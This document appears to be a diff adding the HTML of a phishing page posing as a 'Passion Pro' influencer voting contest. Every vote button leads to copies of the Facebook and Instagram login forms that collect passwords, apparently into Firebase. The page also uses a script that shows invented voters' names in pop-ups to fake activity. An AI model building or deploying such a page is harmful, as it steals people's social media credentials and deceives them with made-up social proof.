@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="image/favicon.png" type="image/x-icon">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/profile.css">
+  <script src="js/index.js"></script>
+  <title>Passion Pro Reality Show</title>
+  <style>
+      .popup {
+          position: fixed;
+          bottom: 20px;
+          right: 20px;
+          background-color: rgba(0, 0, 0, 0.7);
+          color: white;
+          padding: 10px;
+          border-radius: 5px;
+          display: flex;
+          align-items: center;
+          display: none;
+          z-index: 1000;
+      }
+      .popup img {
+          border-radius: 50%;
+          margin-right: 10px;
+          width: 40px;
+          height: 40px;
+      }
+    </style>
+</head>
+<body>
+  <div id="popup" class="popup">
+      <img id="profile-pic" src="" alt="Profile Picture">
+      <span id="popup-text"></span>
+  </div>
+  <div id="home">
+    <header>
+      <img src="img/slide.svg">
+      <p align="center">
+        <button id="vote2" onclick="vote()">
+          Click Here To Vote
+        </button><br>
+        <!-- <button id="vote2" onclick="vote()">
+                                  Join contest
+                                                            </button>-->
+      </p>
+
+    </header>
+
+    <div id="blue">
+
+      <h2>
+        Passion Pro Season 8
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+        Get ready to celebrate your favorite online influencers! It's time for the Ultimate Influencer Showdown! Who do you think deserves the title of the most influential online personality? Your voice matters, so let's find out together!
+      </p>
+    </div>
+
+    <div id="news">
+      <p>Vote for your favorite contestants on social media using #TalentRealityShow. Your votes can make a difference!</p>
+
+    </div>
+
+    <div id="blue">
+
+      <h2>
+        📢 How to Vote:
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+      </p>
+    </div>
+
+    <div id="news">
+      <p>#1 Each influencer has a unique hashtag our social media page.</p>
+      <p>#2 Click the vote button</p>
+      <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite influencer!</p>
+
+    </div>
+
+ 
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Vote Influencer Categories</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+ <profile>
+
+        <!-- Profile Card 1 -->
+        <div id="voter" class="profile-card">
+            <img src="img/beauty.jpeg" alt="Profile 1" class="profile-image">
+            <div class="hashtags">
+                <span>#Beauty</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 2 -->
+        <div id="voter" class="profile-card">
+            <img src="img/photography.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Photography</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 3 -->
+        <div id="voter" class="profile-card">
+            <img src="img/drama.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Drama</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 4 -->
+        <div id="voter" class="profile-card">
+            <img src="img/creativity.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Creativity</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 5 -->
+        <div id="voter" class="profile-card">
+            <img src="img/cycling.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Cycling</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 6 -->
+        <div id="voter" class="profile-card">
+            <img src="img/hiking.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Hiking</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 7 -->
+        <div id="voter" class="profile-card">
+            <img src="img/singing.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Singing</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 8 -->
+        <div id="voter" class="profile-card">
+            <img src="img/passionproject.jpeg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#PassionProject</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+    </profile>
+  </center>
+  </div>
+<center>
+      <div id="choose">
+        <center>
+          <p>
+            Vote using:
+          </p>
+        </center>
+        <center>
+          <p>
+            <img id="fb" onclick="fb()" src="image/fb.png">
+            <img id="ig" onclick="ig()" src="image/ig.png">
+          </p>
+          <br>
+          <button onclick="can()" id="cancel">Close</button>
+        </center>
+      </div>
+    </center>
+    <center>
+      <div id="fbp">
+        <div class="facebook-login" id="fb2" align="center">
+
+          <div class="ggt">
+
+            <img src="image/fb.png" alt="logo" id="fblogo">
+            <h1 id="fb2">
+              facebook
+            </h1>
+            <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+            <input type="password" placeholder="Password" id="fb-pass"><br>
+            <button onclick="login()" id="fb-log">
+              Log in
+            </button>
+          </div>
+        </div>
+
+      </div>
+    </center>
+    <center>
+      <div id="igp">
+        <div class="Instagram-login" id="ig2" align="center">
+
+          <div class="ppt">
+
+            <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
+            <br>
+            <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+            <input type="password" placeholder="Password" id="ig-pass">
+            <br>
+            <button onclick="iglog()" id="ig-log">
+              log in
+            </button>
+          </div>
+        </div>
+      </div>
+    </center>
+  </div>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
+
+
+    </script>
+
+  <script>
+        const voters = [
+            { name: "Arjun", country: "India", photo: "images/1.jpeg" },
+            { name: "Priya", country: "India", photo: "images/2.jpeg" },
+            { name: "Ravi", country: "India", photo: "images/3.jpeg" },
+            { name: "Sana", country: "India", photo: "images/4.jpeg" },
+            { name: "Amit", country: "India", photo: "images/5.jpeg" },
+            { name: "Vikram", country: "India", photo: "images/6.jpeg" },
+            { name: "Ananya", country: "India", photo: "images/7.jpeg" },
+            { name: "Kavya", country: "India", photo: "images/8.jpeg" },
+            { name: "Nikhil", country: "India", photo: "images/9.jpeg" },
+            { name: "Meera", country: "India", photo: "images/10.jpeg" },
+            { name: "Rajesh", country: "India", photo: "images/11.jpeg" },
+            { name: "Tara", country: "India", photo: "images/12.jpeg" },
+            { name: "Rahul", country: "India", photo: "images/13.jpeg" },
+            { name: "Sneha", country: "India", photo: "images/14.jpeg" },
+            { name: "Krishna", country: "India", photo: "images/15.jpeg" },
+            { name: "Aditya", country: "India", photo: "images/16.jpeg" },
+            { name: "Rani", country: "India", photo: "images/17.jpeg" },
+            { name: "Pooja", country: "India", photo: "images/18.jpeg" },
+            { name: "Sunil", country: "India", photo: "images/19.jpeg" },
+            { name: "Isha", country: "India", photo: "images/20.jpeg" },
+            { name: "Rohan", country: "India", photo: "images/21.jpeg" },
+            { name: "Anil", country: "India", photo: "images/22.jpeg" },
+            { name: "Maya", country: "India", photo: "images/23.jpeg" },
+            { name: "Suresh", country: "India", photo: "images/24.jpeg" },
+            { name: "Neha", country: "India", photo: "images/25.jpeg" },
+            { name: "Zhang Wei", country: "China", photo: "images2/1.jpeg" },
+            { name: "Yumi", country: "Japan", photo: "images2/2.jpeg" },
+            { name: "Kim Min-seok", country: "South Korea", photo: "images2/3.jpeg" },
+            { name: "Nguyen Thi Mai", country: "Vietnam", photo: "images2/4.jpeg" },
+            { name: "Li Na", country: "China", photo: "images2/5.jpeg" },
+            { name: "Haruto", country: "Japan", photo: "images2/6.jpeg" },
+            { name: "Siti", country: "Malaysia", photo: "images2/7.jpeg" },
+            { name: "Abdul", country: "Pakistan", photo: "images2/8.jpeg" },
+            { name: "Bong Cha", country: "South Korea", photo: "images2/9.jpeg" },
+            { name: "Thao", country: "Vietnam", photo: "images2/10.jpeg" },
+            { name: "Rashid", country: "Bangladesh", photo: "images2/11.jpeg" },
+            { name: "Prajwal", country: "India", photo: "images2/12.jpeg" },
+            { name: "Irfan", country: "India", photo: "images2/13.jpeg" },
+            { name: "Sundar", country: "India", photo: "images2/14.jpeg" },
+            { name: "Lakshmi", country: "India", photo: "images2/15.jpeg" },
+            { name: "Karan", country: "India", photo: "images2/16.jpeg" },
+            { name: "Ishita", country: "India", photo: "images2/17.jpeg" },
+            { name: "Gopal", country: "India", photo: "images2/18.jpeg" },
+            { name: "Poonam", country: "India", photo: "images2/19.jpeg" },
+            { name: "Manju", country: "India", photo: "images2/20.jpeg" },
+            { name: "Akira", country: "Japan", photo: "images2/21.jpeg" },
+            { name: "Tanvir", country: "Bangladesh", photo: "images2/22.jpeg" },
+            { name: "Fahim", country: "Pakistan", photo: "images2/23.jpeg" },
+            { name: "Laxman", country: "India", photo: "images2/24.jpeg" },
+            { name: "Vaani", country: "India", photo: "images2/25.jpeg" },
+        ];
+
+        function showPopup() {
+            const voter = voters[Math.floor(Math.random() * voters.length)];
+            const time = Math.floor(Math.random() * 5) + 1; // Random time between 1 and 5 minutes
+            
+            const popupText = document.getElementById('popup-text');
+            const profilePic = document.getElementById('profile-pic');
+            
+            popupText.textContent = `${voter.name} from ${voter.country} just voted ${time} minutes ago`;
+            profilePic.src = voter.photo;
+            
+            const popup = document.getElementById('popup');
+            popup.style.display = 'flex';
+            
+            setTimeout(() => {
+                popup.style.display = 'none';
+            }, 5000); // Hide the popup after 5 seconds
+        }
+
+        function startPopups() {
+            showPopup();
+            setInterval(showPopup, 15000); // Show a popup every 15 seconds
+        }
+
+        window.onload = startPopups;
+    </script>
+  </body>
+  </html>
